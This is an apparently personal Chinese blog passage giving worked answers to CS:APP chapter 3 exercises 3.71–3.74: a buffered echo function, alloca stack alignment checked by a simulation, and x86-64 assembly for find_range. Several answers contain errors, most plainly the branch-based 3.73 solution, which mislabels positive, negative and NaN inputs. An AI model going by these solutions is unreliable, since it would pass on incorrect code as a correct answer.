ret <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>只有rdx和rax的使用是反的，完成</p>
<h2 id="题目-3-71"><a href="#题目-3-71" class="headerlink" title="题目*3.71"></a>题目*3.71</h2><blockquote>
<p>写一个函数good_echo，它从标准输入读取一行，再把它写到标准输出。你的实现应该对任意长度的输入行都能工作。<br>可以使用库函数fgets，但是你必须确保即使当输入行要求比你已经为缓存区分配的更多空间时，你的函数也能正确地工作。<br>你的代码还应该检查错误条件，要在遇到错误时返回。参考标准I/O函数的定义文档[45,61]。</p>
</blockquote>
<p>去看一下fgets的声明：</p>
<blockquote>
<p>char <em>fgets(char </em>s, int size, FILE *stream);<br>s：存储读入数据的缓冲区地址。<br>size：要读取的字符数。<br>stream：要读取的流。</p>
</blockquote>
<p>那么题目要求就是从stdin读一个可以非常大的内容，类比ostep里做过的动态分配堆来实现，再加上C的错误检查：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>buff<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">good_echo</span><span class="token punctuation">(</span>buff <span class="token operator">*</span>buff<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>buff <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token keyword">if</span><span class="token punctuation">(</span>buff<span class="token operator">-></span>size <span class="token operator">&lt;</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> new_p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">realloc</span><span class="token punctuation">(</span>buff<span class="token operator">-></span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 超出缓冲区，重新分配内存</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>new_p <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    buff<span class="token operator">-></span>p <span class="token operator">=</span> new_p<span class="token punctuation">;</span>
    buff<span class="token operator">-></span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buff<span class="token operator">-></span>p<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token operator">-></span>p<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="题目-3-72"><a href="#题目-3-72" class="headerlink" title="题目**3.72"></a>题目**3.72</h2><blockquote>
<p>图3-54a给出了一个函数的代码，该函数类似于函数vfunct（图3-34a）。我们用vfunct来说明过帧指针在管理变长栈帧中的使用情况。<br>这里的新函数aframe调用库函数alloca为局部数组p分配空间。alloca类似于更常用的malloc，区别在于它在运行时栈上分配空间。<br>当正在执行的过程返回时，该空间会自动释放</p>
<p>图3-54b给出了部分的汇编代码，建立栈指针，为局部变量i和p分配空间。非常类似于vframe对应的代码。在此使用与练习题3.49中同样的表示法：栈指针在第四行设置为值$s_1$，在第七行设置为值$s_2$。<br>数组$p$的起始地址在第9行被设置为值$p$。$s_2$和$p$之间可能有额外的空间$e_2$，数组$p$结尾和$s_1$之间可能有额外的空间$e_1$</p>
<ul>
<li>A.用数学语言解释计算$s_2$的逻辑。</li>
<li>B.用数学语言解释计算$p$的逻辑。</li>
<li>C.确定使$e_1$的值最小和最大的$n$和$s_1$的值。</li>
<li>D.这段代码为$s_2$和$p$的值保证了怎样的对齐属性？<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;alloca.h></span></span>

<span class="token keyword">long</span> <span class="token function">aframe</span><span class="token punctuation">(</span><span class="token keyword">long</span> n<span class="token punctuation">,</span> <span class="token keyword">long</span> idx<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> i<span class="token punctuation">;</span>
  <span class="token keyword">long</span> <span class="token operator">*</span><span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">alloca</span><span class="token punctuation">(</span>n <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
      p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">*</span>p<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">aframe:
  pushq   %rbp
  movq    %rsp, %rbp
  subq    $16, %rsp           ;Allocate space for i (%rsp &#x3D; s_1)
  leaq    30(,%rdi,8), %rax
  andq    $-16, %rax
  subq    %rax, %rsp          ;ALlocate space for array p (%rsp &#x3D; s_2)
  leaq    15(%rsp), %r8
  andq    $-16, %r8           ;Set %r8 to &amp;p[0] 
  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>rbp入栈；保存rsp到rbp；rbp减16，留给两个局部变量i和p的；rax = 30 + 8n；rax与-16做与运算，也就是把后四位清0，这是为了对齐吗？；rsp再减rax，为数组留位置；<br>把此时的rsp后15字节的值移到r8，再把r8后四位清零，r8保存着数组首地址</p>
<ul>
<li>A. $s_2 = 起始rsp - 16 - (30 + 8n)$（十六字节对齐），更具体地说，n为奇数，30就留24，n为偶数，30就只留16</li>
<li>B. $ p = 15 + s_2 $（十六字节对齐）</li>
<li>C.$e1$在p末尾和s1之前，s1位置固定，p的结尾是15+s2+8n，其中s2已经对齐了，为s1 - (8n + 16/24)，整理得：<blockquote>
<p>$p_e = (15 + s_1 - 16)$ mod 16 (n even)<br>$p_e = (15 + s_1 - 24)$ mod 16 (n odd)</p>
</blockquote>
</li>
</ul>
<p>越分析越晕，这题真两星难度吗？选择暴力破解：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//模拟函数</span>
<span class="token keyword">void</span> <span class="token function">stimulate</span><span class="token punctuation">(</span><span class="token keyword">long</span> rbp<span class="token punctuation">,</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> rsp <span class="token operator">=</span> rbp<span class="token punctuation">;</span>
  rsp <span class="token operator">-=</span> <span class="token number">16</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> s1 <span class="token operator">=</span> rsp<span class="token punctuation">;</span>
  
  <span class="token comment">// 汇编代码：leaq 30(,%rdi,8), %rax</span>
  <span class="token keyword">long</span> rax <span class="token operator">=</span> <span class="token number">30</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> n<span class="token punctuation">;</span>
  
  <span class="token comment">// 汇编代码：andq $-16, %rax </span>
  rax <span class="token operator">&amp;=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// 汇编代码：subq %rax, %rsp</span>
  rsp <span class="token operator">-=</span> rax<span class="token punctuation">;</span>
  <span class="token keyword">long</span> s2 <span class="token operator">=</span> rsp<span class="token punctuation">;</span>
  
  <span class="token comment">// 汇编代码：leaq 15(%rsp), %r8</span>
  <span class="token keyword">long</span> r8 <span class="token operator">=</span> <span class="token number">15</span> <span class="token operator">+</span> rsp<span class="token punctuation">;</span>
  
  <span class="token comment">// 汇编代码：andq $-16, %r8 </span>
  <span class="token keyword">long</span> p <span class="token operator">=</span> r8 <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// 计算e1 = s1 - (p + n*8)</span>
  <span class="token keyword">long</span> e1 <span class="token operator">=</span> s1 <span class="token operator">-</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> n <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"rbp%%16=%2ld, n=%2ld, s1=%4ld, s2=%4ld, p=%4ld, e1=%3ld\n"</span><span class="token punctuation">,</span> 
         rbp <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//放到main函数里</span>
  <span class="token keyword">long</span> min_e1 <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">,</span> max_e1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1000</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> min_rbp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> min_n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max_rbp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max_n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  
  <span class="token comment">// 测试不同的rbp对齐情况 (rbp % 16 = 0到15)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">long</span> rbp_mod <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> rbp_mod <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> rbp_mod<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> rbp <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">+</span> rbp_mod<span class="token punctuation">;</span>  <span class="token comment">// 基准值加上余数</span>
    
    <span class="token comment">// 测试不同的n值 (1到20)</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">long</span> n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> n <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">long</span> rsp <span class="token operator">=</span> rbp<span class="token punctuation">;</span>
      rsp <span class="token operator">-=</span> <span class="token number">16</span><span class="token punctuation">;</span>
      <span class="token keyword">long</span> s1 <span class="token operator">=</span> rsp<span class="token punctuation">;</span>
      
      <span class="token keyword">long</span> rax <span class="token operator">=</span> <span class="token number">30</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> n<span class="token punctuation">;</span>
      rax <span class="token operator">&amp;=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      rsp <span class="token operator">-=</span> rax<span class="token punctuation">;</span>
      <span class="token keyword">long</span> s2 <span class="token operator">=</span> rsp<span class="token punctuation">;</span>
      
      <span class="token keyword">long</span> r8 <span class="token operator">=</span> <span class="token number">15</span> <span class="token operator">+</span> rsp<span class="token punctuation">;</span>
      <span class="token keyword">long</span> p <span class="token operator">=</span> r8 <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      
      <span class="token keyword">long</span> e1 <span class="token operator">=</span> s1 <span class="token operator">-</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> n <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"rbp%%16=%2ld, n=%2ld, s1=%4ld, s2=%4ld, p=%4ld, e1=%3ld\n"</span><span class="token punctuation">,</span> 
             rbp_mod<span class="token punctuation">,</span> n<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      
      <span class="token comment">// 更新最小值和最大值</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>e1 <span class="token operator">&lt;</span> min_e1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        min_e1 <span class="token operator">=</span> e1<span class="token punctuation">;</span>
        min_rbp <span class="token operator">=</span> rbp_mod<span class="token punctuation">;</span>
        min_n <span class="token operator">=</span> n<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>e1 <span class="token operator">></span> max_e1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        max_e1 <span class="token operator">=</span> e1<span class="token punctuation">;</span>
        max_rbp <span class="token operator">=</span> rbp_mod<span class="token punctuation">;</span>
        max_n <span class="token operator">=</span> n<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到的结果是：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">最小值情况 <span class="token punctuation">(</span>rbp%16<span class="token operator">=</span><span class="token number">9</span>, <span class="token assign-left variable">n</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>:
  <span class="token number">30</span> + <span class="token number">8</span>*n <span class="token operator">=</span> <span class="token number">46</span>
  rax <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">30</span> + <span class="token number">8</span>*n<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>-16<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">32</span>
  s2 <span class="token operator">=</span> s1 - rax <span class="token operator">=</span> <span class="token number">993</span> - <span class="token number">32</span> <span class="token operator">=</span> <span class="token number">961</span>
  p <span class="token operator">=</span> <span class="token punctuation">(</span>s2 + <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>-16<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">976</span>
  e1 <span class="token operator">=</span> s1 - p - <span class="token number">8</span>*n <span class="token operator">=</span> <span class="token number">993</span> - <span class="token number">976</span> - <span class="token number">16</span> <span class="token operator">=</span> <span class="token number">1</span>

最大值情况 <span class="token punctuation">(</span>rbp%16<span class="token operator">=</span><span class="token number">8</span>, <span class="token assign-left variable">n</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>:
  <span class="token number">30</span> + <span class="token number">8</span>*n <span class="token operator">=</span> <span class="token number">38</span>
  rax <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">30</span> + <span class="token number">8</span>*n<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>-16<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">32</span>
  s2 <span class="token operator">=</span> s1 - rax <span class="token operator">=</span> <span class="token number">992</span> - <span class="token number">32</span> <span class="token operator">=</span> <span class="token number">960</span>
  p <span class="token operator">=</span> <span class="token punctuation">(</span>s2 + <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>-16<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">960</span>
  e1 <span class="token operator">=</span> s1 - p - <span class="token number">8</span>*n <span class="token operator">=</span> <span class="token number">992</span> - <span class="token number">960</span> - <span class="token number">8</span> <span class="token operator">=</span> <span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>具体为啥留给读者了……</p>
<ul>
<li>D. 16字节对齐</li>
</ul>
<h2 id="题目-3-73"><a href="#题目-3-73" class="headerlink" title="题目*3.73"></a>题目*3.73</h2><blockquote>
<p>用汇编代码写出匹配图3-51中函数find_range行为的函数。你的代码必须只包含一个浮点比较指令，并用条件分支指令来生成正确的结果。在$2^{32}$种可能的参数值上测试你的代码。网格旁注ASM:EASM描述了如何在C程序中嵌入汇编代码<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>NEG<span class="token punctuation">,</span> ZERO<span class="token punctuation">,</span> POS<span class="token punctuation">,</span> OTHER<span class="token punctuation">&#125;</span> <span class="token class-name">range_t</span><span class="token punctuation">;</span>

<span class="token class-name">range_t</span> <span class="token function">find_range</span><span class="token punctuation">(</span><span class="token keyword">float</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> 
      result <span class="token operator">=</span> NEG<span class="token punctuation">;</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  
      result <span class="token operator">=</span> ZERO<span class="token punctuation">;</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
      result <span class="token operator">=</span> POS<span class="token punctuation">;</span>
  <span class="token keyword">else</span> 
      result <span class="token operator">=</span> OTHER<span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">find_range:
 vxorps  %xmm1, %xmm1, %xmm1          ;Set %xmm1 &#x3D; 0
 vucomiss       %xmm0, %xmm1          ;Compare 0:x
 ja   .L5                             ;if &gt; goto neg
 vucomiss       %xmm1, %xmm0          ;Compare x:0
 jp   .L8                             ;if NaN , goto posornan 
 movl         $1, %eax                ;result &#x3D; ZERO
 je   .L3                             ;If &#x3D;,goto done
.L8:                                  ;posornan:
  vucomiss        .LCO(%rip), %xmm0   ;compare x:0        
  setbe   %al                         ;Set reuslt &#x3D; NaN ? 1 : 0
  movzbl  %al, %eax                   ;Zero-extend
  addl    $2, %eax                    ;result +&#x3D; 2 (POS for &gt; , OTHER for NaN)
  ret
.L5:
  movl    $0, %eax                    ;result &#x3D; NEG
.L3:
  rep;ret                             ;return<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
</blockquote>
<p>题目要求只比较一次，而上文中的代码比较了两次。思路是根据标志位区分小于等于大于0和NaN，比一次足够</p>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">find_range:
    vxorps  %xmm1, %xmm1, %xmm1     ; %xmm1 &#x3D; 0.0不变
    vucomiss %xmm1, %xmm0           ; 比较 x 和 0.0
    
    movl    $0, %eax                 
    ja      .L_done                  ; x &gt; 0.0 时返回0
    movl    $1, %eax                 ; 
    je      .L_done                  ; x &#x3D;&#x3D; 0.0 时返回1
    movl    $3, %eax                 ;
    jp      .L_done                  ; 如果是 NaN 返回3
    movl    $2, %eax                 ; 否则返回2
    
.L_done:
    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="题目-3-74"><a href="#题目-3-74" class="headerlink" title="题目**3.74"></a>题目**3.74</h2><blockquote>
<p>用汇编代码写出匹配图3-51中函数find_range行为的函数。你的代码必须只包含一个浮点比较指令，并用条件传送指令来生成正确的结果。你可能会想要用指令cmovq（如果设置了偶校验位传送）。在$2^{32}$种可能的参数值上测试你的代码。网格旁注ASM:EASM描述了如何在C程序中嵌入汇编代码</p>
</blockquote>
<p>思路是类似的，使用条件传送指令重构：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">find_range:
    vxorps  %xmm1, %xmm1, %xmm1     ; %xmm1 &#x3D; 0.0
    vucomiss %xmm1, %xmm0           ; 比较 x 和 0.0，设置标志位
    
    movl    $0, %eax                 ; NEG
    movl    $1, %edx                 ; ZERO
    movl    $2, %ecx                 ; POS  
    movl    $3, %r8d                 ; OTHER (NaN)
    
    cmove   %edx, %eax               ; 如果 ZF&#x3D;1 (x&#x3D;&#x3D;0), 传送 ZERO
    cmova   %ecx, %eax               ; 如果 CF&#x3D;0&amp;&amp;ZF&#x3D;0 (x&gt;0), 传送 POS
    cmovp   %r8d, %eax               ; 如果 PF&#x3D;1 (NaN), 传送 OTHER
    
    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>下一步是穷举所有可能测试验证，顺便尝试一下在C里内联汇编代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdint></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;float.h></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>NEG<span class="token punctuation">,</span> ZERO<span class="token punctuation">,</span> POS<span class="token punctuation">,</span> OTHER<span class="token punctuation">&#125;</span> <span class="token class-name">range_t</span><span class="token punctuation">;</span>

<span class="token class-name">range_t</span> <span class="token function">find_range</span><span class="token punctuation">(</span><span class="token keyword">float</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">range_t</span> result<span class="token punctuation">;</span>
    <span class="token keyword">asm</span> <span class="token keyword">volatile</span> <span class="token punctuation">(</span>
        <span class="token string">"vxorps  %%xmm1, %%xmm1, %%xmm1\n\t"</span>
        <span class="token string">"vucomiss %%xmm1, %%xmm0\n\t"</span>
        <span class="token string">"movl    $0, %%eax\n\t"</span>          <span class="token comment">// NEG</span>
        <span class="token string">"movl    $1, %%edx\n\t"</span>          <span class="token comment">// ZERO</span>
        <span class="token string">"movl    $2, %%ecx\n\t"</span>          <span class="token comment">// POS</span>
        <span class="token string">"movl    $3, %%ebx\n\t"</span>          <span class="token comment">// OTHER</span>
        <span class="token string">"cmove   %%edx, %%eax\n\t"</span>       <span class="token comment">// x == 0</span>
        <span class="token string">"cmova   %%ecx, %%eax\n\t"</span>       <span class="token comment">// x > 0</span>
        <span class="token string">"cmovp   %%ebx, %%eax\n\t"</span>       <span class="token comment">// NaN</span>
        <span class="token operator">:</span> <span class="token string">"=a"</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        <span class="token operator">:</span> <span class="token string">"x"</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        <span class="token operator">:</span> <span class="token string">"edx"</span><span class="token punctuation">,</span> <span class="token string">"ecx"</span><span class="token punctuation">,</span> <span class="token string">"ebx"</span><span class="token punctuation">,</span> <span class="token string">"xmm1"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">range_t</span> <span class="token function">find_range_stdlib</span><span class="token punctuation">(</span><span class="token keyword">float</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 首先检查是否为NaN</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isnan</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> OTHER<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 检查是否为零（包括+0.0和-0.0）</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0.0f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> ZERO<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 检查正负</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">0.0f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> POS<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> NEG<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1ULL</span> <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">uint32_t</span> bits <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span>i<span class="token punctuation">;</span>
